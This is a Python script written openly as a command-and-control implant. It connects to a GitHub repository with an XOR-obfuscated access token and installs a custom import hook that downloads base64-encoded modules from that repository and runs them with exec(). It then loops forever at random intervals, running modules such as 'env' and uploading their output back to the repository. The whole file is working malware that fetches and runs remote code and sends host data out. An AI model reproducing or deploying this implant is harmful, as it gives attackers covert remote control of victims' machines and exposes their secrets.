#!/usr/bin/python3
import random
import sys
import threading
import time
import github3
import base64
import importlib
from datetime import datetime

# Function to decrypt the token
def decrypt_token(encrypted_token, key="my_secret_key"):
    decoded_token = base64.b64decode(encrypted_token.encode()).decode()
    return xor_encrypt_decrypt(decoded_token, key)

def xor_encrypt_decrypt(data, key="my_secret_key"):
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# GitHub credentials
GITHUB_REPO = 'bot'
GITHUB_USER = 'ALLann123'
encrypted_token = 'ChEvLAggGBRAZyI0EhwXHTshCUUCNRcgEyMLExs5LjUbH0QsLTYPDg=='
C2_MODULES = ['ls', 'env']

# Connect to GitHub
def github_connect():
    print('Connecting to GitHub...')
    token = decrypt_token(encrypted_token)  # Decrypt in memory
    session = github3.GitHub(token=token)
    return session.repository(GITHUB_USER, GITHUB_REPO)

# Implant class
class Implant:
    def __init__(self, id, repo):
        self.id = id
        self.output_path = f'output/{id}'
        self.modules = C2_MODULES  # Fixed variable name
        self.repo = repo

    def run_module(self, module):
        timestamp = datetime.now().isoformat()
        output = sys.modules[module].run()  # Access the module
        output_file = f'{self.output_path}/{module}/{timestamp}.out'
        self.repo.create_file(output_file, timestamp, output.encode('utf-8'))

    def run(self):
        while True:
            for module in self.modules:
                __import__(module)  # Proper dynamic import
                importlib.reload(sys.modules[module])  # Reload module
                print(f'Running the module {module}')
                t = threading.Thread(target=self.run_module, args=(module,))
                t.start()
                time.sleep(random.uniform(1, 10))  # Random execution delay

# C2 Module Importer
class C2ModuleImporter:
    def __init__(self, repo_session):
        self.repo = repo_session
        self.module_code = ""

    def find_spec(self, name, path=None, target=None):
        print(f"Getting module {name}...")
        module_content = self.repo.file_contents(f'module/{name}.py').content
        self.module_code = base64.b64decode(module_content.encode()).decode()
        spec = importlib.util.spec_from_loader(name, loader=self, origin=self.repo.git_url)
        return spec

    def exec_module(self, module):
        exec(self.module_code, module.__dict__)  # Load module dynamically
        return None

    def create_module(self, spec):
        return None

# Run the implant
if __name__ == '__main__':
    repo_session = github_connect()
    sys.meta_path.append(C2ModuleImporter(repo_session))
    implant = Implant('o_t_n', repo_session)
    implant.run()
